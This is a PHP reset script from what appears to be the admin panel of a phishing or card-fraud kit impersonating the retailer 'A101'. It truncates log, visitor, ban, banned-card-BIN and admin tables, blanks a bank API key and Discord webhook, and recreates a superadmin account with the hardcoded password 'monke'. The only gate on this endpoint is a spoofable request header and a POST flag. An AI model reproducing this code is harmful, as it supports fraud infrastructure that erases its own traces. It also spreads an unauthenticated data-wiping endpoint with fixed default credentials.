<?php
    include_once(__DIR__ . '/../../config.php');

    if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
        if($_POST['izin'] == true) {
            $pdo->query("TRUNCATE TABLE logs");
            $pdo->query("TRUNCATE TABLE logs_visitor");
            $pdo->query("TRUNCATE TABLE cevrimici_tablosu");
            $pdo->query("TRUNCATE TABLE action_history");
            $pdo->query("TRUNCATE TABLE bans");    
            $pdo->query("TRUNCATE TABLE yasakli_binler");
            $pdo->query("TRUNCATE TABLE admin");
            $isyeri_adi = $pdo->prepare('UPDATE admin_settings SET isyeri_adi = ? WHERE id = ?');
            $isyeri_adi->execute([ "A101 ONLINE", 1 ]);
            $discord_webhook = $pdo->prepare('UPDATE admin_settings SET bank_api_key = ? WHERE id = ?');
            $discord_webhook->execute([ "", 1 ]);
            $discord_webhook = $pdo->prepare('UPDATE admin_settings SET discord_webhook = ? WHERE id = ?');
            $discord_webhook->execute([ 0, 1 ]);
            $discord_webhook_url = $pdo->prepare('UPDATE admin_settings SET discord_webhook_url = ? WHERE id = ?');
            $discord_webhook_url->execute([ "", 1 ]);
            $default_sifre = password_hash("monke", PASSWORD_DEFAULT);
            $stmt = $pdo->prepare('INSERT INTO admin SET kullanici_adi = ?, sifre = ?, yetki = ?, son_gorulme = ?');
            $stmt->execute([ "admin", password_hash("monke", PASSWORD_DEFAULT), "Superadmin", "00.00.0000 00:00:00" ]);
        }
    }

?>